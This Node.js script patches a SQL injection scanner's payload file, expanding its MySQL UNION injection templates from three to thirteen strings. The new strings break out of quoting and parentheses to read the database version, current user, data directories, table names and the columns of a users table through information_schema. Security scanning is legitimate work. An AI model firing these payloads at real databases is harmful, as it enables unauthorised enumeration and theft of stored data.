// Expand MySQL union from 3 to 10+ variants
import { readFileSync, writeFileSync } from 'fs';
import { execSync } from 'child_process';

const path = 'D:/projects/sqli-scanner/server/src/engine/payloads.js';
let src = readFileSync(path, 'utf8');

const NL = '\r\n';

// MySQL union: 3 items -> 14 items
const oldMyUnion = `MySQL: {${NL}    union: [${NL}      "{ORIG} UNION SELECT {NUM},database(),version()-- -",${NL}      "{ORIG}' UNION SELECT {NUM},database(),version()-- -",${NL}      '{ORIG}" UNION SELECT {NUM},database(),version()-- -',${NL}    ],${NL}    error: [`;

const newMyUnion = `MySQL: {${NL}    union: [${NL}      "{ORIG} UNION SELECT {NUM},database(),version()-- -",${NL}      "{ORIG}' UNION SELECT {NUM},database(),version()-- -",${NL}      '{ORIG}" UNION SELECT {NUM},database(),version()-- -',${NL}      "{ORIG}) UNION SELECT {NUM},database(),version()-- -",${NL}      "{ORIG}') UNION SELECT {NUM},database(),version()-- -",${NL}      "{ORIG} UNION ALL SELECT {NUM},database(),version()-- -",${NL}      "{ORIG}' UNION ALL SELECT {NUM},database(),version()-- -",${NL}      "{ORIG} UNION SELECT {NUM},@@version,user()-- -",${NL}      "{ORIG} UNION SELECT {NUM},current_user(),database()-- -",${NL}      "{ORIG}' UNION SELECT {NUM},version(),@@datadir-- -",${NL}      "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1-- -",${NL}      "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=0x7573657273),1-- -",${NL}      "{ORIG}' UNION SELECT {NUM},user(),@@basedir-- -",${NL}    ],${NL}    error: [`;

if (!src.includes(oldMyUnion)) {
  console.log('ERROR: MySQL union not found - checking alternatives...');
  // Try with LF
  const oldLf = oldMyUnion.replace(/\r\n/g, '\n');
  if (src.includes(oldLf)) {
    console.log('Found with LF line endings');
    src = src.replace(oldLf, newMyUnion.replace(/\r\n/g, '\n'));
  } else {
    console.log('Still not found');
    process.exit(1);
  }
} else {
  src = src.replace(oldMyUnion, newMyUnion);
}

writeFileSync(path, src, 'utf8');
console.log('MySQL union expanded!');

// Verify
try {
  execSync('node -c "' + path + '"', { encoding: 'utf8', stdio: 'pipe' });
  console.log('Syntax verification passed!');
} catch (e) {
  console.log('ERROR: Syntax error');
  process.exit(1);
}